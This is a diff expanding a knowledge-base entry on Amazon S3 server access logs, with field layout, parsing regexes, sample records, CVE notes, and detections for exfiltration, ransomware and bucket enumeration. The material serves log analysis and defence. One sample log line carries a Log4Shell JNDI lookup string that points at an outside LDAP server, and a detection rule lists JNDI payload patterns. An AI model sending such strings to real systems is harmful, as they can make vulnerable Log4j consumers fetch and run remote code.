@@ -2,9 +2,302 @@
 id: aws-s3-access
 name: Amazon S3 Server Access Logs
 short: S3 Access
+aka:
+  - S3 server access logging
+  - S3 access logs
+  - aws:s3:accesslogs
 vendor: Amazon Web Services
 category: cloud
-status: stub
-summary: Per-request access records for S3 buckets in a space-delimited format.
+status: full
+updated: "2026-11-12"
+contributors:
+  - wlinde
+tags:
+  - aws
+  - s3
+  - object-storage
+  - access-log
+  - space-delimited
+  - exfiltration
+  - ransomware
+summary: Best-effort, per-request records of every operation against an S3 bucket — object reads, writes, deletes, listings and bucket configuration calls — written as space-delimited text files into a target bucket. They include anonymous and failed requests that CloudTrail data events may not show, and cost nothing beyond storage, which makes them the cheap source for S3 exfiltration, scanning and ransomware detection.
 sourcetypes:
   - st: aws_s3_access
+    desc: Pack Generator sourcetype for S3 server access log records (space-delimited text)
+  - st: aws:s3:accesslogs
+    desc: Splunk Add-on for AWS sourcetype for S3 server access logs (S3 / SQS-based S3 input)
+facts:
+  First released: 2006 (with Amazon S3)
+  Delivery model: Managed AWS feature, enabled per source bucket
+  Log transport: Log objects written to a target S3 bucket (same Region, same account); collect with S3 + SQS notifications
+  Log format: Space-delimited text, one record per request; quoted Request-URI, Referer and User-Agent; - for empty
+  Delivery: Best effort, usually within a few hours; not every request is guaranteed to be logged
+  Key partitioning: Simple prefix or date-based (PartitionedPrefix by event or delivery time)
+  Typical volume: One line per request — 100 B to 1 KB each; busy data buckets produce millions per hour
+  Cribl Pack: No dedicated Dispensary pack found — Cribl's access-log sampling recipe covers aws:s3:accesslogs
+placement:
+  slots:
+    - cloud
+    - remote
+  items:
+    - slot: cloud
+      title: Central logging bucket
+      desc: Each source bucket writes access logs to a target bucket (never itself). Organisations use one log bucket per account/Region and replicate or collect from there.
+    - slot: cloud
+      title: Data lakes and backups
+      desc: Buckets holding analytics data, backups or exports — where bulk reads (exfiltration) and mass deletes (ransomware) show up.
+    - slot: remote
+      title: Public / presigned access
+      desc: Static websites, public downloads and presigned URLs record the external client IP and user agent; anonymous requests show requester as -.
+howItWorks:
+  - title: Per-bucket logging
+    body: Server access logging is turned on per source bucket with a target bucket and prefix. S3 writes log objects into the target on a best-effort basis; records can arrive hours later, and a small share may be missing. For guaranteed, near-real-time records use CloudTrail data events.
+  - title: Record layout
+    body: "Each line is a request: bucket owner, bucket, time, remote IP, requester (canonical ID, IAM ARN or -), request ID, operation (e.g. REST.GET.OBJECT), key, quoted Request-URI, status, error code, bytes sent, object size, total and turn-around time, referer, user agent, version ID, host ID, signature version, cipher, auth type, host header, TLS version, access point ARN, aclRequired and source region. New fields are appended at the end."
+  - title: Operations
+    body: REST.GET/PUT/DELETE.OBJECT for object calls, REST.GET.BUCKET for listings, REST.PUT.BUCKETPOLICY / ACL / PUBLIC_ACCESS_BLOCK for configuration, BATCH.DELETE.OBJECT for multi-object delete, S3.EXPIRE.OBJECT / S3.TRANSITION for lifecycle and WEBSITE.GET.OBJECT for website endpoints.
+  - title: Authentication fields
+    body: authentication_type shows AuthHeader (signed request), QueryString (presigned URL) or - (anonymous). signature_version SigV2 is legacy and should be zero in modern environments. aclRequired = Yes means the request only succeeded because of an ACL.
+  - title: Compared with CloudTrail data events
+    body: Access logs are free to generate, include anonymous and some failed requests and cover lifecycle actions; CloudTrail data events are faster, structured JSON and carry the full IAM identity and access key. Many teams keep both and use access logs as the cheap high-volume layer.
+traffic:
+  handles:
+    - Object reads, writes and deletes (REST API)
+    - Bucket listings and configuration calls
+    - Presigned URL and anonymous requests
+    - Static website requests
+    - Multi-object (batch) deletes
+    - Lifecycle expirations and transitions
+    - Access point requests
+  flow:
+    - step: Request
+      desc: A client sends a signed, presigned or anonymous request to the bucket endpoint or an access point.
+    - step: Authenticate
+      desc: S3 checks the signature (SigV4) and resolves the requester identity.
+    - step: Authorise
+      desc: Bucket policy, IAM, Block Public Access, access-point policy and ACLs decide allow or deny.
+    - step: Execute
+      desc: The operation runs; status, error code, bytes and timings are captured.
+    - step: Buffer
+      desc: S3 batches records for the source bucket over a period.
+    - step: Write log object
+      desc: A log object lands in the target bucket under the configured prefix; an event notification can feed SQS.
+logs:
+  - type: Object read (GET)
+    sourcetype: aws_s3_access
+    format: text
+    share: 40–80 %
+    avg: ~600 B
+    desc: Most of the volume on data buckets. bytes_sent per requester and remote IP over time is the exfiltration signal.
+    pattern: '^(?<bucket_owner>\S+) (?<bucket>\S+) \[(?<time>[^\]]+)\] (?<remote_ip>\S+) (?<requester>\S+) (?<request_id>\S+) (?<operation>\S+) (?<key>\S+) "(?<request_uri>[^"]*)" (?<http_status>\S+) (?<error_code>\S+) (?<bytes_sent>\S+) (?<object_size>\S+) (?<total_time>\S+) (?<turn_around_time>\S+) "(?<referer>[^"]*)" "(?<user_agent>[^"]*)" (?<version_id>\S+) (?<host_id>\S+) (?<signature_version>\S+) (?<cipher_suite>\S+) (?<authentication_type>\S+) (?<host_header>\S+) (?<tls_version>\S+) (?<access_point_arn>\S+) (?<acl_required>\S+) (?<source_region>\S+)$'
+    key:
+      - remote_ip
+      - requester
+      - operation
+      - key
+      - http_status
+      - bytes_sent
+      - user_agent
+      - authentication_type
+    noise:
+      - bucket_owner
+      - request_id
+      - host_id
+      - cipher_suite
+      - version_id
+      - turn_around_time
+    sample: '7cd47ef2be0123456789abcdef0123456789abcdef0123456789abcdef012345 example-finance-reports [12/Nov/2026:09:31:57 +0000] 203.0.113.45 arn:aws:iam::111122223333:user/svc-backup 3E57427F3EXAMPLE REST.GET.OBJECT 2026/q3/payroll.csv "GET /2026/q3/payroll.csv HTTP/1.1" 200 - 48211 48211 41 12 "-" "aws-cli/2.17.20 md/awscrt#0.20.11 ua/2.0 os/linux#6.8.0" - EXAMPLEhostid0123456789abcdefEXAMPLEhostid0123456789abcdef= SigV4 TLS_AES_128_GCM_SHA256 AuthHeader example-finance-reports.s3.eu-west-1.amazonaws.com TLSv1.3 - - eu-west-1'
+  - type: Anonymous / denied request
+    sourcetype: aws:s3:accesslogs
+    format: text
+    share: 1–10 %
+    avg: ~450 B
+    desc: Requests with requester - (no credentials) or error codes such as AccessDenied, NoSuchKey, SignatureDoesNotMatch. Internet scanners and bucket-name guessing show up here.
+    pattern: '^(?<bucket_owner>\S+) (?<bucket>\S+) \[(?<time>[^\]]+)\] (?<remote_ip>\S+) (?<requester>\S+) (?<request_id>\S+) (?<operation>\S+) (?<key>\S+) "(?<request_uri>[^"]*)" (?<http_status>\S+) (?<error_code>\S+) (?<bytes_sent>\S+) (?<object_size>\S+) (?<total_time>\S+) (?<turn_around_time>\S+) "(?<referer>[^"]*)" "(?<user_agent>[^"]*)" (?<version_id>\S+) (?<host_id>\S+) (?<signature_version>\S+) (?<cipher_suite>\S+) (?<authentication_type>\S+) (?<host_header>\S+) (?<tls_version>\S+) (?<access_point_arn>\S+) (?<acl_required>\S+) (?<source_region>\S+)$'
+    key:
+      - remote_ip
+      - requester
+      - operation
+      - request_uri
+      - http_status
+      - error_code
+      - user_agent
+    noise:
+      - bucket_owner
+      - request_id
+      - host_id
+      - object_size
+      - version_id
+    sample: '7cd47ef2be0123456789abcdef0123456789abcdef0123456789abcdef012345 example-finance-reports [12/Nov/2026:03:12:08 +0000] 198.51.100.77 - 5F1A2B3C4DEXAMPLE REST.GET.BUCKET - "GET /?list-type=2&prefix=&max-keys=1000 HTTP/1.1" 403 AccessDenied 243 - 9 - "-" "${jndi:ldap://198.51.100.77:1389/a}" - EXAMPLEhostidAnon0123456789abcdefEXAMPLEhostidAnon01234= - TLS_AES_128_GCM_SHA256 - example-finance-reports.s3.amazonaws.com TLSv1.3 - - -'
+  - type: Delete / batch delete
+    sourcetype: aws_s3_access
+    format: text
+    share: < 5 %
+    avg: ~550 B
+    desc: REST.DELETE.OBJECT and BATCH.DELETE.OBJECT (one line per key of a DeleteObjects call). A burst of deletes by one principal, or PUTs that overwrite objects with new encryption, is the ransomware pattern.
+    pattern: '^(?<bucket_owner>\S+) (?<bucket>\S+) \[(?<time>[^\]]+)\] (?<remote_ip>\S+) (?<requester>\S+) (?<request_id>\S+) (?<operation>\S+) (?<key>\S+) "(?<request_uri>[^"]*)" (?<http_status>\S+) (?<error_code>\S+) (?<bytes_sent>\S+) (?<object_size>\S+) (?<total_time>\S+) (?<turn_around_time>\S+) "(?<referer>[^"]*)" "(?<user_agent>[^"]*)" (?<version_id>\S+) (?<host_id>\S+) (?<signature_version>\S+) (?<cipher_suite>\S+) (?<authentication_type>\S+) (?<host_header>\S+) (?<tls_version>\S+) (?<access_point_arn>\S+) (?<acl_required>\S+) (?<source_region>\S+)$'
+    key:
+      - requester
+      - remote_ip
+      - operation
+      - key
+      - object_size
+      - http_status
+    noise:
+      - bucket_owner
+      - request_id
+      - host_id
+      - cipher_suite
+      - turn_around_time
+    sample: '7cd47ef2be0123456789abcdef0123456789abcdef0123456789abcdef012345 example-backups [12/Nov/2026:10:02:44 +0000] 192.0.2.88 arn:aws:sts::111122223333:assumed-role/BackupRole/i-0abc123def4567890 8A9B0C1D2EEXAMPLE BATCH.DELETE.OBJECT db/2026-11-11/full.dump.gz "POST /?delete HTTP/1.1" 204 - - 734003200 63 - "-" "Boto3/1.35.10 md/Botocore#1.35.10 ua/2.0 os/linux#6.1.0" - EXAMPLEhostidDel0123456789abcdefEXAMPLEhostidDel012345= SigV4 TLS_AES_256_GCM_SHA384 AuthHeader example-backups.s3.eu-west-1.amazonaws.com TLSv1.3 - - -'
+cves:
+  - id: CVE-2022-31159
+    cvss: 6.5
+    year: 2022
+    kev: false
+    scope: traffic
+    title: AWS SDK for Java S3 TransferManager partial path traversal via crafted object keys — the keys are visible in S3 access logs
+    affected: AWS SDK for Java v1 (aws-java-sdk-s3) 1.12.260 and earlier, downloadDirectory
+    fixed: 1.12.261
+    detect: REST.PUT.OBJECT records whose key contains ../ or %2E%2E%2F, written by a principal other than the bucket's normal producers, followed by REST.GET.OBJECT from the application that downloads the directory.
+    avoid: Upgrade the SDK; restrict who can write into buckets your applications download whole prefixes from; validate keys before writing to disk.
+  - id: CVE-2020-8911
+    cvss: 5.6
+    year: 2020
+    kev: false
+    scope: traffic
+    title: AWS S3 Crypto SDK for Go AES-CBC padding oracle — an attacker with bucket write access can decrypt client-side-encrypted objects
+    affected: aws-sdk-go S3 Crypto SDK (V1 client) before 1.34.0
+    fixed: aws-sdk-go 1.34.0 (use the V2 encryption client)
+    detect: Many REST.PUT.OBJECT overwrites of the same encrypted key from an unusual requester, each followed by a GET from the decrypting application and error spikes — the oracle needs thousands of attempts per block.
+    avoid: Migrate to the V2 crypto client (AES-GCM); prefer SSE-KMS server-side encryption; enable versioning and restrict write access.
+  - id: CVE-2021-44228
+    cvss: 10
+    year: 2021
+    kev: true
+    scope: traffic
+    title: Log4Shell — mass scanning sprays JNDI payloads in User-Agent and Referer, which S3 access logs record
+    affected: Apache Log4j 2.0-beta9 – 2.15.0 (excluding 2.12.2, 2.12.3, 2.3.1) in whatever later processes these logs
+    fixed: Log4j 2.17.1 (Java 8), 2.12.4 (Java 7), 2.3.2 (Java 6)
+    detect: "user_agent or referer containing ${jndi:, ${${ or ${lower: in access records — S3 is not vulnerable, but any Java tool that later parses these logs with an old Log4j may be."
+    avoid: Patch log-processing tools; treat the source IPs as scanners; never feed raw user agents into vulnerable loggers.
+detections:
+  - title: Bulk object download (exfiltration)
+    severity: high
+    signals:
+      - operation=REST.GET.OBJECT
+      - high sum(bytes_sent) or distinct keys per requester / remote_ip
+      - new remote_ip for that requester
+    why: Data theft from S3 is a burst of GETs by one identity, often from an IP outside your normal ranges, and often listing first.
+    kql: |-
+      dataset="aws_s3_access" operation="REST.GET.OBJECT" http_status="200"
+      | summarize bytes=sum(toint(bytes_sent)), objects=dcount(key) by requester, remote_ip, bucket, bin(_time, 1h)
+      | where bytes > 5000000000 or objects > 5000
+    mitre:
+      - T1530
+  - title: Mass delete or overwrite (ransomware)
+    severity: critical
+    signals:
+      - operation in BATCH.DELETE.OBJECT / REST.DELETE.OBJECT
+      - or REST.PUT.OBJECT on existing keys
+      - high count per requester
+    why: Cloud ransomware deletes or re-encrypts objects (e.g. SSE-C with an attacker key) after copying them; volume per identity is the signal.
+    kql: |-
+      dataset="aws_s3_access" operation in ("BATCH.DELETE.OBJECT","REST.DELETE.OBJECT","REST.PUT.OBJECT")
+      | summarize deletes=countif(operation has "DELETE"), puts=countif(operation=="REST.PUT.OBJECT"), keys=dcount(key) by requester, bucket, bin(_time, 15m)
+      | where deletes > 1000 or (puts > 1000 and keys > 1000)
+    mitre:
+      - T1485
+      - T1486
+  - title: Anonymous listing or bucket enumeration
+    severity: medium
+    signals:
+      - requester=-
+      - operation=REST.GET.BUCKET
+      - error_code AccessDenied / NoSuchBucket burst
+    why: Scanners guess bucket names and try anonymous listings; a 200 on an anonymous listing means the bucket is public.
+    kql: |-
+      dataset="aws_s3_access" requester="-" operation="REST.GET.BUCKET"
+      | summarize tries=count(), ok=countif(http_status=="200") by remote_ip, bucket, user_agent
+      | where tries > 20 or ok > 0
+    mitre:
+      - T1619
+      - T1580
+  - title: Bucket policy, ACL or public access block changed
+    severity: high
+    signals:
+      - operation in REST.PUT.BUCKETPOLICY / REST.PUT.ACL / REST.DELETE.PUBLIC_ACCESS_BLOCK
+    why: Opening a bucket to the world or another account is how data is staged for exfiltration or exposed by mistake.
+    kql: |-
+      dataset="aws_s3_access"
+      | where operation in ("REST.PUT.BUCKETPOLICY","REST.PUT.ACL","REST.DELETE.PUBLIC_ACCESS_BLOCK","REST.PUT.PUBLIC_ACCESS_BLOCK","REST.PUT.BUCKETOWNERSHIPCONTROLS")
+      | project _time, bucket, requester, remote_ip, operation, http_status, user_agent
+    mitre:
+      - T1562.007
+      - T1537
+  - title: Legacy SigV2 or ACL-dependent access
+    severity: low
+    signals:
+      - signature_version=SigV2
+      - acl_required=Yes
+    why: SigV2 should be gone; it points to old tooling or stolen long-term keys used with outdated clients. ACL-dependent access blocks disabling ACLs.
+    kql: |-
+      dataset="aws_s3_access"
+      | where signature_version=="SigV2" or acl_required=="Yes"
+      | summarize count() by bucket, requester, user_agent, signature_version, acl_required
+    mitre:
+      - T1078.004
+  - title: Exploit payloads in user agent
+    severity: medium
+    signals:
+      - "user_agent contains ${jndi: or ${${"
+    why: Identifies scanner infrastructure and catches payloads before they reach a vulnerable log consumer.
+    kql: |-
+      dataset="aws_s3_access"
+      | where user_agent has_any ("${jndi:","${${","${lower:") or referer has_any ("${jndi:","${${")
+      | summarize count() by remote_ip, bucket, user_agent
+    mitre:
+      - T1190
+optimizations:
+  - title: Sample successful GETs on public content
+    saving: 40–80 %
+    fn: Sampling
+    how: Static website and asset buckets are dominated by 200/304 GETs. Sample 10:1, keep all errors, deletes, PUTs and configuration operations at full fidelity.
+    expr: /^(REST|WEBSITE)\.GET\.OBJECT$/.test(operation) && (http_status=='200' || http_status=='304')
+  - title: Aggregate reads to per-principal metrics
+    saving: 60–90 % of GET volume
+    fn: Aggregations
+    how: Roll REST.GET.OBJECT up to requests, distinct keys and bytes_sent per bucket, requester and remote_ip per 5 minutes for the SIEM; keep raw in Lake for investigations.
+    expr: operation=='REST.GET.OBJECT' && http_status=='200'
+  - title: Drop lifecycle and internal service operations
+    saving: 5–30 %
+    fn: Drop
+    how: S3.EXPIRE.OBJECT, S3.TRANSITION.OBJECT and replication / inventory reads by AWS service principals are expected and repetitive.
+    expr: /^S3\.(EXPIRE|TRANSITION|CREATE\.DELETEMARKER)/.test(operation) || /s3.amazonaws.com|AWSConfig/.test(requester)
+  - title: Parse and drop low-value fields
+    saving: 25–40 %
+    fn: Parser → Serialize
+    how: bucket_owner, host_id and request_id are long opaque strings, - placeholders are noise. Parse with the regex, drop them and empty values, serialise as JSON or key=value.
+    expr: "remove: bucket_owner, host_id, request_id, version_id, turn_around_time; drop value=='-'"
+references:
+  - title: Amazon S3 server access log format
+    url: https://docs.aws.amazon.com/AmazonS3/latest/userguide/LogFormat.html
+  - title: Logging requests with server access logging
+    url: https://docs.aws.amazon.com/AmazonS3/latest/userguide/ServerLogs.html
+  - title: AWS SDK for Java advisory GHSA-c28r-hw5m-5gv3 (CVE-2022-31159)
+    url: https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3
+  - title: GitHub advisory GHSA-f5pg-7wfw-84q9 (CVE-2020-8911)
+    url: https://github.com/advisories/GHSA-f5pg-7wfw-84q9
+  - title: Apache Log4j security vulnerabilities
+    url: https://logging.apache.org/log4j/2.x/security.html
+  - title: Cribl recipe for sampling access logs (Apache, ELB, CDN, S3)
+    url: https://docs.cribl.io/stream/usecase-access-logs/
+  - title: CISA Known Exploited Vulnerabilities catalog
+    url: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+related:
+  - cloudtrail
+  - aws-cloudfront
+  - aws-elb
+  - aws-guardduty
+  - aws-config
+  - aws-security-lake
